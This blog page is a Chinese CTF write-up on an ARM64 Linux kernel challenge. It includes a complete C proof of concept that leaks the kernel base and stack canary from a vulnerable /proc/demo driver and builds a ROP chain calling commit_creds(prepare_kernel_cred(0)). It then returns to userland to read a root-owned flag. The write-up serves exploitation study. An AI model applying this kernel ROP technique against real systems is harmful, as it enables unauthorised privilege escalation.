<!DOCTYPE html>
<html lang="zh-CN">

<head>
        <link rel="canonical" href="https://qataraddress.github.io/html/category/article-3247.htm" />
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>CTF babyarm内核题目分析 - Qatar Address</title>
        <link rel="icon" href="/assets/addons/xcblog/img/qataraddress/favicon.ico" type="image/x-icon"/>
    <!-- Bootstrap -->
    <link href="/assets/addons/xcblog/css/qataraddress/bootstrap.min.css" rel="stylesheet">
    <!-- Style CSS -->
    <link href="/assets/addons/xcblog/css/qataraddress/style.css" rel="stylesheet">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Fira+Sans:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
    <link href="/assets/addons/xcblog/css/qataraddress/owl.carousel.css" rel="stylesheet">
    <link href="/assets/addons/xcblog/css/qataraddress/owl.theme.default.css" rel="stylesheet">
    <!-- FontAwesome CSS -->
    <link rel="stylesheet" type="text/css" href="/assets/addons/xcblog/css/qataraddress/fontello.css">
    <link href="/assets/addons/xcblog/css/qataraddress/font-awesome.min.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?f2cd1f435343615e6078c743d0623024";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
     crossorigin="anonymous"></script>
</head>

<body>
        <!-- top-bar -->
    <div class="top-bar">
        <div class="container">
            <div class="row">
                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                    <div class="logo">
                                                <a href="/">Qatar Address</a>
                                            </div>
                </div>
            </div>
        </div>
    </div>
    <!-- /.top-bar -->
    <!-- header-section-->
    <div class="header-wrapper">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                    <!-- navigations-->
                    <div class="navigation">
                        <div id="navigation">
                            <ul>
                                                                <li><a href="/">首页</a></li>
                                                                <li><a href="/html/category/">文章分类</a></li>
                                                                <li><a href="#">关于</a></li>
                                <li><a href="#">联系</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <!-- /.navigations-->
                </div>
            </div>
        </div>
    </div>
    <!-- /. header-section-->
    <!-- page-header -->
    <div class="page-header">
        <div class="container">
            <div class="row">
                <div class="col-lg-10 col-md-10 col-sm-10 col-xs-12">
                    <div class="page-section">
                        <h1 class="page-title">CTF babyarm内核题目分析</h1>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                    <div class="page-breadcrumb">
                        <ol class="breadcrumb">
                            <li><a href="/">首页</a></li>
                            <li><a href="/html/category/">文章分类</a></li>
                            <li>正文</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- /.page-header-->
    <!-- /.page-header-->
    <div class="space-medium">
        <div class="container">
            <div class="row">
                <div class="col-md-9">
                      				  				  				<p>本文从漏洞分析、ARM64架构漏洞利用方式来讨论如何构造提权PoC达到读取root权限的文件。此题是一个ARM64架构的Linux 5.17.2 版本内核提权题目，目的是读取root用户的flag文件。</p> <h1 id="概况">概况</h1> <p>题目默认开启了KASLR地址随机化和PXN防护，指定CPU核心数量为一，线程为一。</p> <p>使用<code>cpio</code>命令分离出驱动模块后放到IDA查看，只实现了<code>read</code>和<code>write</code>函数的功能，功能相当简单。<code>read</code>函数把内核栈内容拷贝到全局变量<code>demo_buf</code>，然后再把<code>demo_buf</code>的内容拷贝到用户态缓冲区，长度不超过0x1000。其他不重要的信息可以不用看：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/48e320f90b7bef07779c3e67e02c2eac.jpg" alt="CTF babyarm内核题目分析"></p> <p><code>write</code>函数把用户态缓冲区内容拷贝到<code>demo_buf</code>，然后将<code>demo_buf</code>内容拷贝到内核栈中，同样长度不超过0x1000：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/51ba2ef404c4941111f96abace81004d.jpg" alt="CTF babyarm内核题目分析"></p> <h1 id="利用思路">利用思路</h1> <p>知道模块的基本功能之后，现在来考虑利用方式。</p> <ul> <li>首先，题目启动脚本中没有给定<code>nokaslr</code>，默认开启地址随机化，需要泄露内核地址，当然还有canary。并且ARM架构下默认开启了PXN，内核无法直接执行用户态代码，需要使用ROP技术。</li> <li>上一步泄露完成之后，可以获得kernel中的gadget地址，以此来构造ROP，执行<code>commit_creds(prepare_kernel_cred(0))</code>提升进程权限，返回用户态，并<code>fork</code>一个新的shell，就可以继承父进程的权限完成提权</li> </ul> <h1 id="编写poc">编写PoC</h1> <p>第一步的泄露很简单，直接使用<code>read</code>函数功能就可以达到目的，代码如下：</p> <pre><code class="language-c">int fd = open("/proc/demo",2);  size_t leak[0x200] = {0}; read(fd, leak, 0x1f8); for (int i = 0; i &lt; 100; i++) { 	printf("id %d : 0x%llx\n",i,leak[i]); }</code></pre> <p>这里编译的时候需要使用交叉编译为ARM64的程序。交叉编译环境的安装方式很简单：</p> <pre><code class="language-bash">sudo apt-get install emdebian-archive-keyring sudo apt-get install linux-libc-dev-arm64-cross libc6-arm64-cross sudo apt-get install binutils-aarch64-linux-gnu gcc-8-aarch64-linux-gnu sudo apt-get install g++-8-aarch64-linux-gnu</code></pre> <p>编译exp:</p> <pre><code class="language-bash">aarch64-linux-gnu-gcc-8 -static exp.c -o exp</code></pre> <p>重新打包后运行exp，根据泄露的结果得知第3个值是内核代码地址，第13个值是canary</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/9c77472212b0935bac624a0cd0dd49b7.jpg" alt="CTF babyarm内核题目分析"></p> <p>用ARM64的基础加载地址 0xffff800008000000 算出内核基址、<code>commit_creds</code>和<code>prepare_kernel_cred</code>的地址：</p> <pre><code class="language-c">size_t commit_creds, prepare_kernel_cred = 0; size_t kernel_base,offset = 0;  size_t kernel_addr = leak[2]; size_t canary = leak[12];  offset = kernel_addr - 0xffff8000082376f8; kernel_base = 0xffff800008000000 + offset;  commit_creds = kernel_base + 0xa2258; prepare_kernel_cred = kernel_base + 0xa24f8;</code></pre> <p>接下来要考虑如何构造ROP链，如何返回用户态。</p> <p>这里先了解一下ARM64汇编指令和x86_64指令的区别：</p> <ul> <li>x86_64指令六个参数为RDI、RSI、RDX、RCX、R8、R9，函数结束时使用<code>LEAVE</code>和<code>RET</code>平衡栈，返回值放在RAX寄存器中，<code>RET</code>指令会使RSP+8</li> <li>ARM64有X0～X30这些寄存器，参数一为X0寄存器，返回值同样使用X0寄存器，栈指针为SP寄存器，PC寄存器存储当前指令，使用<code>LDP X29, X30, [SP]</code> 这种方式给X29和X30寄存器赋值，当<code>RET</code>指令时将X30寄存器值给PC寄存器，但<code>RET</code>指令不会使SP+8，也就是说ARM64不会像X86那样频繁移动栈顶</li> </ul> <p>根据以上结论，我们需要控制ARM64的执行流，就需要控制X30寄存器，并给参数寄存器X0赋值。而现在内核栈是我们可控的，那么理论上就可以控制PC指针。</p> <p>首先调用<code>prepare_kernel_cred(0)</code>，参数为0，需要将X0赋值为0，ROPgadget工具不是很好用，直接手动找，在内核文件中找到如下gadget：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/3aa2f1d7a3741f21a80bf43d70765ca8.jpg" alt="CTF babyarm内核题目分析"></p> <p>这一部分控制了很多寄存器，可以极大的方便我们后续操作。通过调试偏移写出payload如下：</p> <pre><code class="language-c">	size_t gadget2 = kernel_base + 0x16950;  	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred;</code></pre> <p>调试的时候发现一个问题，因为ARM64的<code>RET</code>指令并不会使用栈中的数据作为返回地址，而是使用X30寄存器的值，在<code>prepare_kernel_cred</code>函数结束后，由于X30寄存器还是之前的值，又再次执行了<code>prepare_kernel_cred</code>，这显然不是想要的结果。这里先看看ARM程序是怎么开辟栈帧的：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/51a4403b698668a9deab1c1827f003ba.jpg" alt="CTF babyarm内核题目分析"></p> <p>这是在内核中随便找的函数，不用考虑这个函数做了什么，重点关注第一条指令和最后两条指令，第一条指令将X29和X30寄存器放入到栈中，最后两条指令平衡栈。如果去掉第一条指令，那么在平衡栈的时候就会将我们构造的内容给X29和X30。这里也看到ARM不像x86那样可以通过加减地址来获得不同的指令，ARM指令必须以四字节对齐为一个指令。所以在执行<code>prepare_kernel_cred</code>时应该地址加上四字节，执行<code>commit_creds</code>函数也是同理。调试修改上面的payload为如下：</p> <pre><code class="language-c">	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[19] = 0; 	leak[20] = 0; 	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred + 4; 	leak[32] = commit_creds + 4; 	leak[36] = gadget2;  	leak[37] = 0x7777777777777777; 	leak[38] = canary; 	leak[39] = 0x2222222222222222; 	leak[40] = 0x3333333333333333;</code></pre> <p>执行完<code>commit_creds(prepare_kernel_cred(0))</code>后，当前exp进程的<code>cred</code>结构体已经是root，但内核栈已经被我们破坏掉了，继续执行会导致内核崩溃重启，此时需要手动返回用户态起shell。</p> <p>需要知道的是ARM64使用<code>SVC</code>指令进入内核态，使用<code>ERET</code>指令返回用户态，同x86一样，ARM在进入内核态之前会保存用户态所有寄存器状态，在返回时恢复。其中比较重要的寄存器有SP_EL0、ELR_EL1、SPSR_EL1，它们保存内容分别如下：</p> <ul> <li>SP_EL0保存用户态的栈指针</li> <li>ELR_EL1保存要返回的用户态PC指针</li> <li>SPSR_EL1保存一个值，暂不知道是何用处，但他的值是固定的0x80001000</li> </ul> <p>我们手动恢复这几个寄存器，然后在调用ERET时就可以返回用户态执行函数了。而要找到恢复这些寄存器的gadget可以直接在调试器中单步跟随，找到内核何时返回用户态，然后直接使用这些gadget就行。内容如下：</p> <pre><code class="language-c">   0xffff800008011fe4:	msr	sp_el0, x23    0xffff800008011fe8:	tst	x22, #0x10    0xffff800008011fec:	b.eq	0xffff800008011ff4  // b.none    0xffff800008011ff0:	nop    0xffff800008011ff4:	ldr	x0, [x28, #3432]    0xffff800008011ff8:	b	0xffff800008012024     0xffff800008012024:	msr	elr_el1, x21    0xffff800008012028:	msr	spsr_el1, x22    0xffff80000801202c:	ldp	x0, x1, [sp]    0xffff800008012030:	ldp	x2, x3, [sp, #16]    0xffff800008012034:	ldp	x4, x5, [sp, #32]    0xffff800008012038:	ldp	x6, x7, [sp, #48]    0xffff80000801203c:	ldp	x8, x9, [sp, #64]    0xffff800008012040:	ldp	x10, x11, [sp, #80]    0xffff800008012044:	ldp	x12, x13, [sp, #96]    0xffff800008012048:	ldp	x14, x15, [sp, #112]    0xffff80000801204c:	ldp	x16, x17, [sp, #128]    0xffff800008012050:	ldp	x18, x19, [sp, #144]    0xffff800008012054:	ldp	x20, x21, [sp, #160]    0xffff800008012058:	ldp	x22, x23, [sp, #176]    0xffff80000801205c:	ldp	x24, x25, [sp, #192]    0xffff800008012060:	ldp	x26, x27, [sp, #208]    0xffff800008012064:	ldp	x28, x29, [sp, #224]    0xffff800008012068:	nop    0xffff80000801206c:	nop    0xffff800008012070:	nop</code></pre> <p>观察这两段gadget，这些寄存器我们都可以控制，这就比较简单了，直接拿过来用就可以了，并且在执行完这段gadget后，会自动执行<code>ERET</code>指令，其实这段函数就是内核返回用户态的代码。指定上面三个关键寄存器的值，用户态栈地址可以随意指定一个，内核只做地址校验，并不会触发panic，ELR_EL1构造为用户态代码地址，最后修改payload如下：</p> <pre><code class="language-c">	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[19] = 0; 	leak[20] = 0; 	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred + 4; 	leak[32] = commit_creds + 4; 	leak[33] = 0x1111111111111111;  	leak[36] = gadget2;  	leak[37] = 0x7777777777777777; 	leak[38] = canary; 	leak[39] = 0x2222222222222222; 	leak[40] = 0x3333333333333333; 	leak[41] = (size_t)leak;          // x29  far_el1=0x00ffffc150b790  	leak[42] = kernel_base + 0x11fe4; // x30  	leak[43] = 0x6666666666666666;    // x19 	leak[44] = 0x7777777777777777;    // x20 	leak[45] = (size_t)shell;         // x21   elr_el1=0x41f518 	leak[46] = 0x80001000;            // x22   spsr_el1=0x80001000 	leak[47] = (size_t)leak;          // x23   sp_el0=0x00ffffc150b790 	leak[48] = 0x2222222222222222;    // x24 	leak[49] = 0x3333333333333333;    // x25 	leak[51] = 0x4444444444444444;</code></pre> <p>完整PoC如下，最后执行<code>system("/bin/sh")</code>时，在<code>clone</code>系统调用时会失败，原因可能是因为某个ARM寄存器未还原，触发了缺页机制，会分配一个新的页，最后PC指针指向这个非法地址，无法获取shell，所以改成了ORW的方式读取flag：</p> <pre><code class="language-c">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;linux/types.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/wait.h&gt;  size_t commit_creds, prepare_kernel_cred = 0; // 0xffff8000080a2258 0xffff8000080a24f8 size_t kernel_base,offset = 0; // 0xffff800008000000 size_t gadget2 = 0;  void shell(void) { 	// int uid = getuid(); 	// printf("uid == %d\n",uid); 	// system("/bin/sh"); 	char buf[0x40] = {0}; 	int fd = open("/flag",0); 	read(fd, buf, 0x40); 	write(1, buf, 0x40); }  int main() { 	int fd = open("/proc/demo",2); 	if (fd &lt; 0) 	{ 		puts("open error"); 		exit(-1); 	}  	size_t leak[0x200] = {0};  	read(fd, leak, 0x1f8); 	for (int i = 0; i &lt; 36; i++) 	{ 		printf("id %d : 0x%llx\n",i,leak[i]); 	} 	size_t kernel_addr = leak[2]; 	size_t canary = leak[12]; 	printf("kerenl_addr== 0x%llx , canary == 0x%llx\n",kernel_addr,canary);  	offset = kernel_addr - 0xffff8000082376f8;  	kernel_base = 0xffff800008000000 + offset; //ffffd587d10a2258 0xffffd587d10a2258, 	commit_creds = kernel_base + 0xa2258; 	prepare_kernel_cred = kernel_base + 0xa24f8; 	gadget2 = kernel_base + 0x16950;  	printf("kerenl_base== 0x%llx ,commit_creds == 0x%llx, prepare_kernel_cred == 0x%llx\n",kernel_base,commit_creds,prepare_kernel_cred); 	printf("%p\n",leak);  	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[19] = 0; 	leak[20] = 0; 	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred + 4; 	leak[32] = commit_creds + 4; 	leak[33] = 0x1111111111111111; 	leak[36] = gadget2;  	leak[37] = 0x7777777777777777; 	leak[38] = canary; 	leak[39] = 0x2222222222222222; 	leak[40] = 0x3333333333333333; 	leak[41] = (size_t)leak;          // x29  far_el1=0x00ffffc150b790 	leak[42] = kernel_base + 0x11fe4; // x30 	leak[43] = 0x6666666666666666;    // x19 	leak[44] = 0x7777777777777777;    // x20 	leak[45] = (size_t)shell;         // x21   elr_el1=0x41f518 	leak[46] = 0x80001000;            // x22   spsr_el1=0x80001000 	leak[47] = (size_t)leak;          // x23   sp_el0=0x00ffffc150b790 	leak[48] = 0x2222222222222222;    // x24 	leak[49] = 0x3333333333333333;    // x25 	leak[51] = 0x4444444444444444;  	 	write(fd, leak, 0x200); 	close(fd);  	return 0; };</code></pre> <p>完成读取root权限的文件flag：<br /><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/0bd4cf07b86facf2feef5ed3137605b4.jpg" alt="CTF babyarm内核题目分析"></p> 			
                    <div class="clearfix"></div>
                    <div class="col-md-12 mt-5">
                                                <p>上一个：<a href="/html/category/article-3246.htm">Vue项目中添加一些独立的静态资源（内嵌独立静态页面等）</a></p>
                                                <p>下一个：<a href="/html/category/article-3248.htm">Day02—Python的变量类型、变量命名、变量类型检查、变量类型转换、运算符</a></p>
                                            </div>
                                    </div>
                <div class="col-md-3">
                    <div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">热门文章</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2"><a href="/html/category/article-3396.htm" title="CentOS7设置固定IP地址详解">CentOS7设置固定IP地址详解</a></li>
                        <li class="py-2"><a href="/html/category/article-3393.htm" title="node.js &#8211; http、模块化、npm">node.js &#8211; http、模块化、npm</a></li>
                        <li class="py-2"><a href="/html/category/article-3379.htm" title="如果我将提供NULL，将返回什么MySQL ASCII()函数？">如果我将提供NULL，将返回什么MySQL ASCII()函数？</a></li>
                        <li class="py-2"><a href="/html/category/article-3409.htm" title="Hyperledger Fabric 通道配置文件和容器环境变量详解">Hyperledger Fabric 通道配置文件和容器环境变量详解</a></li>
                        <li class="py-2"><a href="/html/category/article-3380.htm" title="springboot的依赖管理和自动配置">springboot的依赖管理和自动配置</a></li>
                        <li class="py-2"><a href="/html/category/article-3383.htm" title="Vue简单实现自定义拖拽">Vue简单实现自定义拖拽</a></li>
                        <li class="py-2"><a href="/html/category/article-3751.htm" title="记一次RabbitMQ连接阻塞，全部队列不消费异常">记一次RabbitMQ连接阻塞，全部队列不消费异常</a></li>
                        <li class="py-2"><a href="/html/category/article-3378.htm" title="Django 之视图url参数获取">Django 之视图url参数获取</a></li>
                        <li class="py-2"><a href="/html/category/article-3420.htm" title="mysql从服务列表里消失">mysql从服务列表里消失</a></li>
                        <li class="py-2"><a href="/html/category/article-3377.htm" title="Android 4.0.1破坏了WebView HTML 5本地存储？">Android 4.0.1破坏了WebView HTML 5本地存储？</a></li>
                    </ul>
    </div>
</div>

<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">归纳</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">56</span> <a href="/html/date/2024-06/" title="2024-06 归档">2024-06</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">61</span> <a href="/html/date/2024-05/" title="2024-05 归档">2024-05</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">60</span> <a href="/html/date/2024-04/" title="2024-04 归档">2024-04</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-03/" title="2024-03 归档">2024-03</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">44</span> <a href="/html/date/2024-02/" title="2024-02 归档">2024-02</a></h4>
            </li>
                    </ul>
    </div>
</div>


                </div>
            </div>
        </div>
    </div>
        <!-- footer -->
    <div class="footer">
        <!-- tiny-footer -->
        <div class="container">
            <div class="row">
                <div class="tiny-footer">
                    <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                        <p class="tiny-footer-para">
                            Qatar Address 版权所有 Powered by WordPress
                        </p>
                    </div>
                    <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                        <div class="tiny-section-social">
                            <div class="">
                                <ul>
                                    <li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
                                    <li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
                                    <li><a href="#"><i class="fa fa-google-plus-square"></i></a></li>
                                    <li><a href="#"><i class="fa fa-instagram"></i></a></li>
                                    <li><a href="#"><i class="fa fa-linkedin-square"></i></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /. tiny-footer -->
        </div>
    </div>
    <!-- /.footer -->
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="/assets/addons/xcblog/js/frontend/qataraddress/jquery.min.js" type="text/javascript"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="/assets/addons/xcblog/js/frontend/qataraddress/bootstrap.min.js" type="text/javascript"></script>
    <script src="/assets/addons/xcblog/js/frontend/qataraddress/menumaker.js" type="text/javascript"></script>
    <script type="text/javascript" src="/assets/addons/xcblog/js/frontend/qataraddress/jquery.sticky.js"></script>
    <script type="text/javascript" src="/assets/addons/xcblog/js/frontend/qataraddress/sticky-header.js"></script>
    <script type="text/javascript" src="/assets/addons/xcblog/js/frontend/qataraddress/owl.carousel.min.js"></script>
    <script type="text/javascript" src="/assets/addons/xcblog/js/frontend/qataraddress/multiple-carousel.js"></script>
    <script>
    $(function() {
        $('.js_to').click(function(){
            var url = $(this).data('url');
            var code = $(this).data('code');
            url += code;

            window.open(url);
        })
    });
    </script>
</body>

</html>